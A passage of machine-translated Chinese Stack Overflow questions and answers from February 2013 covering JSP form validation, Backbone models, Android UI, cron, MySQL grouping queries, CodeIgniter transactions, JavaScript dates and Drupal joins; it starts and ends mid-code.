    // replace all the canvas pixels with your modified pixels
    ctx.putImageData(imgData,0,0); 
```

# html - 在发送到服务器之前验证 HTML5 数字输入

> ID：14847497
> 
> 赞同：1
> 
> 时间：2013-02-13T06:09:39.923
> 
> 标签：html, validation, jsp, input, numeric

我正在编写一个基于 Web 的应用程序来进行计算。我不想让用户在 JSP 上填写表单，然后在另一个 JSP 上获取结果，而是希望有一个使用 HTML5 的 HTML 页面来询问用户输入数字，然后在 JSP 上显示计算的输出。是否有任何服务器端方法来验证用户只输入了数字信息？到目前为止，我使用了 3 个 HTML5 输入框，例如： `<input type="number" name="width" min=".1" step=".1" max="500">`

如果用户输入低于最小值或超过最大值的数字输入，它似乎唯一的验证是捕获。如果没有输入，它仍然会发送。我希望它不让您发送数据，除非所有 3 个框都有效。我知道你可以简单地使用 JavaScript，但它是一个 JSP 类，所以如果我使用 HTML 或 JSP 以外的任何东西，我的导师不会喜欢。提前致谢。

编辑

这是他们将收到提示的页面：

`<form method="get" action="carpetprice.jsp"> Width of room in feet: <input type="number" name="width" min=".1" step=".1" max="500"><br /> Length of room in feet: <input type="number" name="length" min=".1" step=".1" max="500"><br /> Price of carpet per square foot: <input type="number" name="width" min=".1" step=".1" max="500"><br /> <input type="submit" value="Compute Carpet Price"> </form>`

在完全验证之前，我不希望它向“carpetprice”发送任何数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:33:59.057

在页面上，您需要的表单实际上需要一个`<form>`标签。您应该显示您使用的所有代码。这是一个例子：

```
<form method="POST" action="check.jsp">
<input type="number" name="width" min=".1" step=".1" max="500" name="someMeaningfulName" />
<input type="submit" />
</form> 
```

然后在 check.jsp 你会有类似的东西

```
<%
String toBeValidated = request.getParameter("someMeaningfulName");
//rest of the validation process here
%> 
```

使用 if 语句检查整数是否在一定范围内。如果验证失败，你没有说你想要发生什么。用户是否被重定向回带有表单的页面？

# javascript - 如何将一个主干模型与另一个关联？

> ID：14847498
> 
> 赞同：0
> 
> 时间：2013-02-13T06:09:41.017
> 
> 标签：javascript, json, backbone.js, model

我有以下 JSON 回复

```
{
   "results":[
      {
         "Product":{
            "id":"1",
            "short_name":"Infra - 2200 CAS Sma SIMO onl [DAS.1.1]",
            "serial_number":"DAS.1.1",
            "created_by":"Wesley Jace Tan",
            "modified_by":"Wesley Jace Tan",
            "created":"2013-02-11 07:58:20",
            "modified":"2013-02-11 07:58:20",
            "full_name_type":"2200",
            "full_name_cas_stk":"CAS",
            "full_name_size":"Small",
            "full_name_simo_mimo":"SIMO only",
            "full_name_product_code":"(2961-737)",
            "uom":"lot",
            "material":"Infra"
         },
         "Price":[
            {
               "id":"1",
               "product_id":"1",
               "source_file":"LTE Test File.xls",
               "for_financial_year":"FY12_13",
               "created_by":"Wesley Jace Tan",
               "modified_by":"Wesley Jace Tan",
               "created":"2013-02-11 07:58:20",
               "modified":"2013-02-11 07:58:20",
               "gross_unit":"50.00",
               "gross_total_value":"0.00",
               "gross_total_formula":"=K12*J12",
               "incentive_value":"5",
               "incentive_formula":"5",
               "net_price_unit":"0.00",
               "net_price_total_value":"0.00",
               "net_price_total_formula":"=N12*J12"
            }
         ]
      },
      {
         "Product":{
            "id":"2",
            "short_name":"Infra - 2200 CAS Sma SIMO to  [DAS.1.2]",
            "serial_number":"DAS.1.2",
            "created_by":"Wesley Jace Tan",
            "modified_by":"Wesley Jace Tan",
            "created":"2013-02-11 07:58:20",
            "modified":"2013-02-11 07:58:20",
            "full_name_type":"2200",
            "full_name_cas_stk":"CAS",
            "full_name_size":"Small",
            "full_name_simo_mimo":"SIMO to MIMO Retrofit",
            "full_name_product_code":"(2961-737)",
            "uom":"lot",
            "material":"Infra"
         },
         "Price":[
            {
               "id":"2",
               "product_id":"2",
               "source_file":"LTE Test File.xls",
               "for_financial_year":"FY12_13",
               "created_by":"Wesley Jace Tan",
               "modified_by":"Wesley Jace Tan",
               "created":"2013-02-11 07:58:20",
               "modified":"2013-02-11 07:58:20",
               "gross_unit":"11.00",
               "gross_total_value":"0.00",
               "gross_total_formula":"=K13*J13",
               "incentive_value":"24",
               "incentive_formula":"24",
               "net_price_unit":"0.00",
               "net_price_total_value":"0.00",
               "net_price_total_formula":"=N13*J13"
            }
         ]
      },
      {
         "Product":{
            "id":"3",
            "short_name":"Infra - 2200 CAS Sma Full MIM [DAS.1.3]",
            "serial_number":"DAS.1.3",
            "created_by":"Wesley Jace Tan",
            "modified_by":"Wesley Jace Tan",
            "created":"2013-02-11 07:58:20",
            "modified":"2013-02-11 07:58:20",
            "full_name_type":"2200",
            "full_name_cas_stk":"CAS",
            "full_name_size":"Small",
            "full_name_simo_mimo":"Full MIMO",
            "full_name_product_code":"(2961-737)",
            "uom":"lot",
            "material":"Infra"
         },
         "Price":[
            {
               "id":"3",
               "product_id":"3",
               "source_file":"LTE Test File.xls",
               "for_financial_year":"FY12_13",
               "created_by":"Wesley Jace Tan",
               "modified_by":"Wesley Jace Tan",
               "created":"2013-02-11 07:58:20",
               "modified":"2013-02-11 07:58:20",
               "gross_unit":"12.00",
               "gross_total_value":"0.00",
               "gross_total_formula":"=K14*J14",
               "incentive_value":"5",
               "incentive_formula":"5",
               "net_price_unit":"0.00",
               "net_price_total_value":"0.00",
               "net_price_total_formula":"=N14*J14"
            }
         ]
      }
   ]
} 
```

检索上述数据的 url 是 /products/index.json

检索产品数据第 2 页的 url 是 /products/index.json/page:2

我的目标是拥有一个具有骨干价格模型的骨干产品模型。

因此，上述结果数组中的每个条目都会生成一个 Product 和 Price 主干模型实例。

在 Backbone 模型之间建立关联是否理想？

我该如何做到这一点？

**更新**

尝试推荐的解决方案后，我收到以下错误消息。未捕获的类型错误：对象函数 (){return c.apply(this,arguments)} 没有方法 'fetch'

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T07:28:28.263

您需要覆盖[collection.parse](http://backbonejs.org/#Collection-parse)。示例代码：

```
var Products = Backbone.Collection.extend({
            model: Product, 
            url: '/products/index.json',
            parse: function(response) {
                return _.map(response.results, // map each result to a product
                      function(result){
                          var product = result.Product;
                          product.price = new Price(result.Price); // create a price model
                          return product; // Backbone will convert the product to model
                      });
            }
        }); 
```

# android - 禁用按钮

> ID：14847502
> 
> 赞同：0
> 
> 时间：2013-02-13T06:09:51.200
> 
> 标签：android

我的问题：我想让一个活动包含微调器和编辑框和按钮我想让按钮禁用，直到用户填写框并从微调器中选择一个项目。我写了它检查是否为空它禁用按钮但是当我填充框时按钮仍然禁用..!!第二个问题：当我将提示放入编辑框时它会在检查框是否为空时读取它！如果选择了微调器，我该如何检查？*value 是editText 的名称 *enterBtn 是按钮的名称。

```
 if(x.matches("")){
                enterBtn.setEnabled(false);
                 onStart();
            }else {
                enterBtn.setEnabled(true);
            }
            enterBtn.setOnClickListener(new OnClickListener(){

                public void onClick(View arg0) {
                    // TODO Auto-generated method stub

                if(Integer.valueOf(x)>(70)){
                Value.setText("plz dont enter more than 500");
                    }else{
........
...} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T08:17:50.110

```
Use Listener For Edit Box And Spinner..when you enters text to the Edit Text it Does not Check Whether It Has Text Entered Or not..thats why your button gets disabled..hear is the listner where you can actually get when someone entered text to Editext.

tv = (TextView)findViewById(R.id.charCounts);

    textMessage = (EditText)findViewById(R.id.textMessage);

    textMessage.addTextChangedListener(new TextWatcher(){
        public void afterTextChanged(Editable s) {
            i++;
            tv.setText(String.valueOf(i) + " / " + String.valueOf(charCounts));
        }

    }); 
```

# cron - cron 作业无法重新启动服务

> ID：14847503
> 
> 赞同：0
> 
> 时间：2013-02-13T06:09:56.350
> 
> 标签：cron, solaris, restart

我有一个简单的脚本来停止和启动服务（Oracle Hyperion）

```
#!bin/ksh

/path/to/dir/stop.sh

sleep 1200

/path/to/dir/start.sh 
```

我每天晚上都安排了它，它确实运行了，但是之后数据库连接出现了问题。但是当我手动运行时`stop.sh`，`start.sh`没有这样的问题。显然，这项工作还没有完全运行。

这是来自的输出`crontab -l`

```
00 02 * * * /export/home/oracle/scheduled_restart.sh 
```

有人可以就这个问题提出建议吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T12:32:25.047

在执行完全相同的代码期间，cron 作业与命令行不同的通常原因是环境，特别是 ORACLE_SID、TWO_TASK、LD_LIBRARY_PATH 等变量。

假设 oracle 用户拥有 crontab：当作业由 crond 运行时，它相当于 su oracle，而不是 su - oracle。尝试做一些事情来确保该命令获取 oracle 用户在登录期间通常会获取的所有内容。

看看发生了什么：

```
/export/home/oracle/scheduled_restart.sh && set > /tmp/my_variables.txt 
```

`/bin/sh` 如果`/export/home/oracle/scheduled_restart.sh`文件是可执行的，则不需要。它应该在第 1 行有一个 shebang。例如：`#!/bin/ksh` 用于 korn shell 或您使用的任何 shell。

# java - 在返回变量之前检查数组中的所有位置

> ID：14847504
> 
> 赞同：1
> 
> 时间：2013-02-13T06:09:57.880
> 
> 标签：java, arrays, string, throws

如果在我的菜单数组中按名称找到，我有这个方法返回一个食谱对象。如果它没有找到它，它会抛出一个自定义的 RecipeNotFoundException 并只是说它没有找到......

```
public static Recipe getRecipe(String recipeName){

    try{

        for(int j = 0 ; j < Menu.length ; j++){

            if(Menu[j].getName().equals(recipeName)){

                return (Recipe)Menu[j];

            }

            else{

                throw new RecipeNotFoundException();

            }
        }

}catch(RecipeNotFoundException e){

    System.out.println("Recipe Not Found!");

}   

    return null;

} 
```

在当前条件下，它只检查第一个菜单点，我如何让它在抛出异常之前检查所有这些点！？我尝试过反转和翻转，但它只会导致 NullPointerExceptions 并检查整个事情而无法进行投掷。有人得到一些指导吗？提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:12:43.467

整个循环完成后抛出异常：

```
for (int j = 0; j < Menu.length; j++) {
    if (Menu[j].getName().equals(recipeName)) {
        return (Recipe) Menu[j];
    }
}
throw new RecipeNotFoundException(); 
```

如果它找到一个配方，它将在到达抛出异常的行之前返回。

当然，这里抛出异常有点没有意义。如果你没有做任何其他事情，你可以在循环之后添加你的错误处理代码而不是抛出你的异常，因为它只是在同一个方法中被捕获，无论如何。当您希望由方法的调用者而不是方法本身来处理错误时，通常会抛出异常。

# android - Android中的php等效hash_hmac函数

> ID：14847505
> 
> 赞同：1
> 
> 时间：2013-02-13T06:10:01.467
> 
> 标签：android, hash

我一直在寻找适用于 android 的 php 等效 hash_hmac 函数，我的 php 函数是这样的

```
$sharedSecret = "YSHSHAJKD==";
$URL = "http://sadas.com";
hash_hmac("sha1", $URL, base64_decode($sharedSecret)) 
```

# mysql - mysql查询按日期获取行数据的最大计数？

> ID：14847511
> 
> 赞同：0
> 
> 时间：2013-02-13T06:10:39.987
> 
> 标签：mysql, sql, database, inner-join

我有一个表名为 a_ad_display 以下列

```
displayId | campaignId | displaytime(date)

1          |    2      | 2012-12-19 12:41:08
2          |    2      | 2012-12-19 01:41:08
3          |    1      | 2012-12-20 10:41:08
4          |    1      | 2012-12-20 02:41:08
5          |    1      | 2012-12-21 12:41:08
6          |    2      | 2012-12-21 01:41:08
7          |    1      | 2012-12-21 12:41:08
8          |    1      | 2012-12-21 02:41:08 
```

应该有一个具有相同campaignId的多个条目。现在我想要的是首先获取a_ad_display中计数最高的campaignId，对于那个campaignId，我想获得日期内的计数总数

例如..从上表中，我有 1 个行数最高的活动 ID

所以对于 1 号campaignId 我想显示这样的记录..

```
 **Date**     | **countPerDay**
 2012-12-19          |      0
 2012-12-20          |      2
 2012-12-21          |      3 
```

我怎样才能在mysql数据库中实现这一点......希望任何人都可以指导我......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:20:47.437

您可以使用此查询

```
select 
    count(campaignId) as TCount,
    DATE(displayTime) as `Date`
from a_ad_display
where campaignId = 1
group by DATE(displayTime) 
```

虽然它不会显示 0。

编辑 ：

OK 这已修改并获取您的结果。

```
select
  date(a.displayTime) as `DisplayTime`,
  ifnull(l.TCount,0) as TCount
from a_ad_display as a
  left join (select
           count(campaignId) as TCount,
           displayTime
         from a_ad_display
         where campaignId = 1
         group by DATE(displayTime)) as l
    on date(a.displayTime) = date(l.displayTime)
group by DATE(a.displayTime) 
```

## [演示](http://www.sqlfiddle.com/#!2/f9331/1)

更多编辑：

```
select
  date(a.displayTime) as `DisplayTime`,
  ifnull(l.TCount,0) as TCount
from a_ad_display as a
  left join (select
           count(campaignId) as TCount,
           displayTime
         from a_ad_display
         where campaignId = 1
         group by DATE(displayTime)) as l
    on date(a.displayTime) = date(l.displayTime)
group by DATE(a.displayTime)
order by a.displaytime desc limit 5 
```

这是您可以选择最新 5 条记录的方法。如果您想选择最新的广告系列，您可以使用子查询而不是 1 查看此查询

```
select
  date(a.displayTime) as `DisplayTime`,
  ifnull(l.TCount,0) as TCount
from a_ad_display as a
  left join (select
       count(campaignId) as TCount,
       displayTime
     from a_ad_display
     where campaignId = (select  campaignId from a_ad_display group by campaignId order by count(campaignId) desc limit 1)
     group by DATE(displayTime)) as l
    on date(a.displayTime) = date(l.displayTime)
group by DATE(a.displayTime) 
```

编辑：

我已经编辑了查询，这将获取更高发生率的活动 ID 并相应地获取结果

## [演示](http://www.sqlfiddle.com/#!2/f9331/11)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T06:27:39.217

这也将显示 0

```
 select 
       sum(case when campaignId = @inputCompainid then 1 else 0 end) as TCount, 
        DATE(displayTime) as `Date`
    from a_ad_display
    group by DATE(displayTime) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T06:22:50.587

以下查询为您提供了每个活动 ID 的记录列表

```
select campaignId,date(displaytime) as Date,count(*) as countPerDay from a_ad_display group by campaignId,date(displaytime); 
```

如果您需要特定的campaignId，请使用：

```
select campaignId,date(displaytime) as Date,count(*) as countPerDay from a_ad_display group by campaignId,date(displaytime) having campaignId=1; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T07:25:10.357

很抱歉问这个问题，但是这个查询中哪一个更好？

[1.raheel shan](https://stackoverflow.com/users/713141/raheel-shan)先生的回答

```
EXPLAIN SELECT DATE(a.displayTime) AS `DisplayTime`,IFNULL(l.TCount,0) AS TCount
FROM a_ad_display AS a
LEFT JOIN (SELECT
       COUNT(campaignId) AS TCount,
       displayTime
     FROM a_ad_display
     WHERE campaignId = 1
     GROUP BY DATE(displayTime)) AS l
ON DATE(a.displayTime) = DATE(l.displayTime)
GROUP BY DATE(a.displayTime);

id  select_type  table         type  possible_keys  key  key_len  ref  rows  Extra                                            
1   PRIMARY      <derived2>    ALL                                     2                                                   
1   PRIMARY      a             ALL                                     8     Using temporary; Using filesort               
2   DERIVED      a_ad_display  ALL                                     8     Using where; Using temporary; Using filesort 
```

2.或者使用这个

```
EXPLAIN SELECT DATE(a_ad_display.`displaytime`) AS `DATE`, 
               COUNT(a.`campaignId`) AS `COUNT Per Day` 
        FROM a_ad_display 
        LEFT JOIN (SELECT `a_ad_display`.`displayId`,
                          `a_ad_display`.`campaignId` 
                   FROM `a_ad_display` 
                   WHERE `a_ad_display`.`campaignId`=1) a 
        ON (`a_ad_display`.`displayId`=a.`displayId`)
        GROUP BY `a_ad_display`.`displaytime`;

id  select_type  table         type  possible_keys  key  key_len  ref  rows  Extra                              
1   PRIMARY      a_ad_display  ALL                                     8     Using temporary; Using filesort  
1   PRIMARY      <derived2>    ALL                                     5                                       
2   DERIVED      a_ad_display  ALL                                     8     Using where 
```

感谢之前和之后：D

**编辑**最高的campaignId出现

```
SELECT DATE(a_ad_display.`displaytime`) AS `DATE`, COUNT(a.`campaignId`) AS `COUNT Per Day` FROM a_ad_display 
LEFT JOIN (SELECT `a_ad_display`.`displayId`,`a_ad_display`.`campaignId` FROM `a_ad_display`
   INNER  JOIN (SELECT COUNT(`a_ad_display`.`campaignId`) AS `count`, `a_ad_display`.`campaignId` 
        FROM `a_ad_display` 
        GROUP BY `a_ad_display`.`campaignId` 
        ORDER BY `count` DESC 
        LIMIT 1) b ON (a_ad_display.`campaignId`=b.`campaignId`)
   ) a ON (`a_ad_display`.`displayId`=a.`displayId`)
GROUP BY `DATE`; 
```

分组依据`a_ad_display`。`displaytime`; **/* 这个语句有误...，对不起*/** 现在应该可以工作了.....再试一次。你可以在这里检查[http://sqlfiddle.com/#!2/bc75b/1](http://sqlfiddle.com/#!2/bc75b/1)，希望它能正常工作：D

# php - 在 PHP Codeigniter 中提交表单后创建 SQL 文件

> ID：14847512
> 
> 赞同：3
> 
> 时间：2013-02-13T06:10:46.880
> 
> 标签：php, mysql, sql, codeigniter

我有一个数据输入项目，使用 PHP Codeigniter 的在线 Web 应用程序。我的项目中有 150 多个问题，用户大约 400 人。

我担心有这么多问题和这么多用户，特别是我只是使用简单的方法将数据插入数据库。我使用表单操作并使用 POST 提交。

我认为，将我之前提交的数据转换为 SQL 文件并上传到服务器会更好。但我不知道这种方法。或者，也许我可以使用其他方法或方式？

需要帮助，对不起我糟糕的英语，非常感谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T14:36:42.380

为了使数据库保持一致状态，您应该使用事务（如果您在一个请求中插入/更新来自多个表的数据）。

```
$db->beginTransaction();
try 
{
    // insert data to first table
    // insert data to second table
    ...
    // insert data to last table

    $db->commit();                 
}
catch (Exception $e)
{
    $db->rollBack();
} 
```

这是一个使用 Zend 的示例，但其思想与 CodeIgniter 相同。也许实现（方法名称）不同。

CodeIgniter 示例：

```
$this->db->trans_start();
$this->db->query('AN SQL QUERY...');
$this->db->query('ANOTHER QUERY...');
$this->db->query('AND YET ANOTHER QUERY...');
$this->db->trans_complete(); 
```

在这里您可以找到有关 CodeIgniter 事务的更多信息：http: [//ellislab.com/codeigniter/user-guide/database/transactions.html](http://ellislab.com/codeigniter/user-guide/database/transactions.html)

# android - 如何在android中搜索项目后更新listview

> ID：14847513
> 
> 赞同：3
> 
> 时间：2013-02-13T06:10:49.990
> 
> 标签：android, listview, search, filter

目前我正在研究如何在为edittext中的项目提供关键字时从列表视图中查找项目，现在我的“*查找*”功能正常工作但在吐司消息中显示找到的项目，并且列表视图定位的项目保持不变，如何更新我的 listivew 以获取其中的过滤结果。这是我的代码

```
public class Home extends ListActivity {

//how many to load on reaching the bottom
int itemsPerPage = 15;
boolean loadingMore = false;                        

//For test data :-)
Calendar d = Calendar.getInstance();

ArrayList<String> songsList;
ListView list;
LazyAdapter adapter;
JSONArray posts;

//ArrayList thats going to hold the search results
ArrayList<HashMap<String, String>> searchResults;
LayoutInflater inflater;
// All static variables
static final String URL = "http://india.abc.net/ads/?json=get_recent_posts";    
static final String KEY_POSTS = "posts";
static final String KEY_ID = "id";
static final String KEY_TITLE = "title";
static final String KEY_DATE = "date";
static final String KEY_CONTENT = "content";
static final String KEY_AUTHOR = "author";
static final String KEY_NAME = "name";
static final String KEY_ATTACHMENTS = "attachments";
static final String KEY_SLUG = "slug";
static final String KEY_THUMB_URL = "thumbnail";
static final String KEY_IMAGES = "images";
static final String KEY_URL = "url";

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    final EditText searchBox=(EditText) findViewById(R.id.search);
    final ListView  list=(ListView)findViewById(android.R.id.list);

    //get the LayoutInflater for inflating the customomView
    //this will be used in the custom adapter
    inflater=(LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);

    final  ArrayList<HashMap<String, String>> songsList = new ArrayList<HashMap<String, String>>();

   // Creating JSON Parser instance
   final JSONParser jParser = new JSONParser();

   // getting JSON string from URL
       JSONObject json = jParser.getJSONFromUrl(URL);
                try {
                     posts = json.getJSONArray(KEY_POSTS);

        // looping through all song nodes <song>
                for(int i = 0; i < posts.length(); i++){
                    JSONObject c = posts.getJSONObject(i);
                    // Storing each json item in variable
                    String id = c.getString(KEY_ID);
                    String title = c.getString(KEY_TITLE);
                    String date = c.getString(KEY_DATE);
                    String content = c.getString(KEY_CONTENT);
                    // to remove all <P> </p> and <br /> and replace with ""
                     content = content.replace("<br />", "");
                     content = content.replace("<p>", "");
                     content = content.replace("</p>", "");

                    //authornumber is agin  JSON Object
                    JSONObject author = c.getJSONObject(KEY_AUTHOR);
                    String name = author.getString(KEY_NAME);

                    String url = null;
                    String slug = null;
                    try {
                    JSONArray atta = c.getJSONArray("attachments");
                    for(int j = 0; j < atta.length(); j++){
                        JSONObject d = atta.getJSONObject(j);

                        slug = d.getString(KEY_SLUG);

                        JSONObject images = d.getJSONObject(KEY_IMAGES);

                        JSONObject thumbnail = images.getJSONObject(KEY_THUMB_URL);
                        url = thumbnail.getString(KEY_URL);

                    }
                    } catch (Exception e) {
                        e.printStackTrace();

                    }

            // creating new HashMap
            HashMap<String, String> map = new HashMap<String, String>();

            // adding each child node to HashMap key => value
            map.put(KEY_ID, id);
            map.put(KEY_TITLE, title);
            map.put(KEY_DATE, date);
            map.put(KEY_NAME, name);
            map.put(KEY_CONTENT, content);
            map.put(KEY_SLUG, slug);
            map.put(KEY_URL, url);

            // adding HashList to ArrayList
            songsList.add(map);
                }   
                }catch (JSONException e) {
                    e.printStackTrace();

                    }

              //searchResults=OriginalValues initially
                searchResults=new ArrayList<HashMap<String, String>>(songsList);

         // Getting adapter by passing json data ArrayList
            adapter=new LazyAdapter(this, songsList);    
             list.setAdapter(adapter);

             searchBox.addTextChangedListener(new TextWatcher() {

                 public void onTextChanged(CharSequence s, int start, int before, int count) {
                   //get the text in the EditText
                   String searchString=searchBox.getText().toString();
                   int textLength=searchString.length();

                          //clear the initial data set
                   searchResults.clear();

                   for(int i=0;i<songsList.size();i++)
                   {
                  String playerName=songsList.get(i).get("title").toString();

                  if(textLength<=playerName.length()){

                  //compare the String in EditText with Names in the ArrayList
                    if(searchString.equalsIgnoreCase(playerName.substring(0,textLength)))
                          Toast.makeText(getApplicationContext(),playerName,1).show();
                    searchResults.add(songsList.get(i));

                  }
                   }

                   adapter.notifyDataSetChanged();
                 }

                 public void beforeTextChanged(CharSequence s, int start, int count,
                     int after) {

                   }

                   public void afterTextChanged(Editable s) {

                   }
                  }); 
```

**适配器类：**

```
 public class LazyAdapter extends BaseAdapter {
  TextView title;
  private Activity activity;
  // private TextWatcher textWatcher;
  private ArrayList<HashMap<String, String>> data;
private static LayoutInflater inflater=null;
public ImageLoader imageLoader; 

public LazyAdapter(Activity a, ArrayList<HashMap<String, String>> d) {
    activity = a;
    data=d;
    inflater = (LayoutInflater)activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    imageLoader=new ImageLoader(activity.getApplicationContext());
}

public int getCount() {
    return data.size();
}

public Object getItem(int position) {
    return position;
}

public long getItemId(int position) {
    return position;
}

public View getView(int position, View convertView, ViewGroup parent) {
    View vi=convertView;
    if(convertView==null)
        vi = inflater.inflate(R.layout.activity_home, null);

    TextView title = (TextView)vi.findViewById(R.id.title); // title
    TextView date = (TextView)vi.findViewById(R.id.date); // artist name
    TextView content = (TextView)vi.findViewById(R.id.content);  // duration
    TextView name = (TextView)vi.findViewById(R.id.name); 
    // duration
    ImageView thumb_image=(ImageView)vi.findViewById(R.id.list_image); // thumb image

    HashMap<String, String> song = new HashMap<String, String>();
    song = data.get(position);

    // Setting all values in listview
   title.setText(song.get(Home.KEY_TITLE));
    date.setText(song.get(Home.KEY_DATE));
    content.setText(song.get(Home.KEY_CONTENT));
    name.setText(song.get(Home.KEY_NAME));

   imageLoader.DisplayImage(song.get(Home.KEY_URL), thumb_image);
    return vi;
}

public void add(String string) {
    // TODO Auto-generated method stub

}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T08:01:39.663

我没有查看您的代码，但是通过查看您的问题，我认为您必须`listview`在您在编辑文本中键入文本时更新您的代码，因此您必须像这样设置`addTextChangedListener`您的`EditText`代码并将您的搜索功能放入`afterTextChanged`方法中然后执行此操作

```
 MyCustomAdapter adapter = new MyCustomAdapter(getApplicationContext(), R.id.listview1, string_array);
  list.setAdapter(adapter);
adapter.notifyDataSetChanged(); 
```

最后它会起作用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T08:09:48.570

## 替换 searchBox.addTextChangedListener(new TextWatcher() {

} 经过

```
searchBox.addTextChangedListener(new TextWatcher() {

                 public void onTextChanged(CharSequence s, int start, int before, int count) {
                   //get the text in the EditText
                    searchString=searchBox.getText().toString();
                    textLength=searchString.length();
                   searchResults.clear();

                   for(int i=0;i<songsList.size();i++)
                   {
                   playerName=songsList.get(i).get("title").toString();
                  System.out.println("player name "+playerName);
                  if(textLength<=playerName.length()){
                  //compare the String in EditText with Names in the ArrayList
                    if(searchString.equalsIgnoreCase(playerName.substring(0,textLength))){
                    searchResults.add(songsList.get(i));
                    System.out.println("the array list is "+songsList.get(i));
                    adapter=new LazyAdapter(Home.this, searchResults);   

                     list.setAdapter(adapter);
                    }

                      }

                   }
                   if(searchResults.isEmpty()){
                       Toast toast= Toast.makeText(getApplicationContext(), 
                                  "No Items Matched", Toast.LENGTH_SHORT);  
                                  toast.setGravity(Gravity.CENTER_VERTICAL|Gravity.CENTER_HORIZONTAL, 0, 0);
                                  toast.show();
                   }
                   adapter.notifyDataSetChanged();
                 }

                 public void beforeTextChanged(CharSequence s, int start, int count,
                     int after) {
                 System.out.println("before changed");

                   }

                   public void afterTextChanged(Editable s) {

                                               System.out.println("after changed");
                   }
                  }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T07:29:09.137

在适配器上调用[notifyDataSetChanged()](http://developer.android.com/reference/android/widget/BaseAdapter.html#notifyDataSetChanged%28%29)。

`notifyDataSetChanged()`可以在此[Google I/O 视频](http://www.youtube.com/watch?v=wDBM6wVEO70&t=17m38s)中查看有关如何/何时调用的一些其他细节。

# java - 从打印机获取打印确认

> ID：14847516
> 
> 赞同：0
> 
> 时间：2013-02-13T06:10:55.810
> 
> 标签：java, printing, command

我正在使用以下代码向网络`Lipi`打印机打印（***cc2****是打印机名称*）

```
Process p = Runtime.getRuntime ().exec ("lp -dcc2 abcd.txt");
BufferedReader reader = new BufferedReader (
    new InputStreamReader (p.getInputStream ()));
String line;
while ((line = reader.readLine ()) != null) {
    System.out.println (line);
} 
```

当我在循环（> 4000）中运行它并且一些打印在网络中丢失并且没有被打印时，问题就开始了。

我想抓住那些丢失的照片并重新打印它们。

如何让打印机确认已收到打印件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:22:01.630

检查手册以了解您的`lp`命令实现。一些实现可以在打印完成时发出通知，但这种通知的形式可能会有所不同。还有一个`-m`开关，告诉`lp`一旦打印完成就向启动打印的用户发送电子邮件。也许您可以通过 Java 应用程序以某种方式检查这些电子邮件。无论如何，这个问题更多的是关于你的操作系统的打印系统，而不是关于 Java。

# javascript - 我想将字符串“var=02-24-2013 12:40:00.0”转换为 java 脚本日期对象？

> ID：14847519
> 
> 赞同：0
> 
> 时间：2013-02-13T06:11:14.573
> 
> 标签：javascript

```
<span id="datePickerSpan${email.id}">
<g:formatDate date="${scheduleDate}" format="dd-MM-yyyyHH:mm"/>
</span>
<input type="text" id="datePicker${email.id}" style="display:none"/>
<span onclick="openDateTimePicker('${email.id}')"></span>    

<g:javascript>

    var str='${scheduleDate}';//2013-02-2412:40:00.0
    str = str.replace(/(\d{2}:\d{2}:\d{2}).*$/g, '$1');
    alert("Str is=> "+str);//2013-02-24 12:40:00
    var date2=new Date(str);
    alert(" yy dd mm alert"+date2);//invalid date object
    str = str.replace(/^(\d{4})-(\d{2})-(\d{2})/g, '$2-$3-$1');
    alert("now new Str is =>"+str);//02-24-2013 12:40:00.0
    var date=new Date(str);
    alert("now str date is =>"+date);//invalid date object
    var date1=new Date();
alert("java script date is =>"+date1);//Wed Feb 13 2013 11:16:55 GMT+0530 (India Standard Time)
    $('#datePicker${email.id}').datetimepicker({
      dateFormat: 'dd-mm-yy',
      timeFormat: 'HH:mm',
      minDateTime: new Date(),
      maxDateTime:null,
      defaultDate:new Date(),
      showOn: "button",
      buttonImage: requestPath + "/images/calendar.gif",
      buttonImageOnly: true,
      onSelect : function(dateText,obj){
            saveRescheduleDate(${email.id},dateText);
            }
     });
 </g:javascript> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:14:18.777

[JavaScript Date 对象](http://www.w3schools.com/jsref/jsref_obj_date.asp)是使用 new Date() 创建的。：

```
new Date("02-24-2013 12:40:00.0"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:33:02.640

你可以像这样声明 Date 对象

```
var dt= new Date("October 13, 1975 11:13:00") 
```

试试这个链接以获得更多参考

[http://www.w3schools.com/js/js_obj_date.asp](http://www.w3schools.com/js/js_obj_date.asp)

# mysql - 左加入 Drupal 7

> ID：14847523
> 
> 赞同：0
> 
> 时间：2013-02-13T06:11:25.303
> 
> 标签：mysql, drupal-7, left-join

我对 Drupal 7 Mysql 查询有这个问题，尤其是在 LEFT JOIN 上。

我找到了这个解决方案，但我似乎无法将它应用于我的问题，因为我不知道语法是如何进行的。

[https://drupal.stackexchange.com/questions/4317/how-do-i-write-a-left-join-query](https://drupal.stackexchange.com/questions/4317/how-do-i-write-a-left-join-query)

这是我在上面的链接中找到的解决方案。

```
$terms = db_select('taxonomy_index', 'ti')
  ->fields('ti', array('tid', 'name'))
  ->leftJoin('taxonomy_term_data', 'ttd', 'ti.tid = ttd.tid')
  ->condition('vid', 2)
  ->condition('nid', $nid)
  ->execute();

foreach ($terms as $term) {
  // $term contains the object for the taxonomy term.
} 
```

然而，我在如何将其应用于我的查询时遇到了问题。

这是我在 mysql 上的 LEFT JOIN 查询。

```
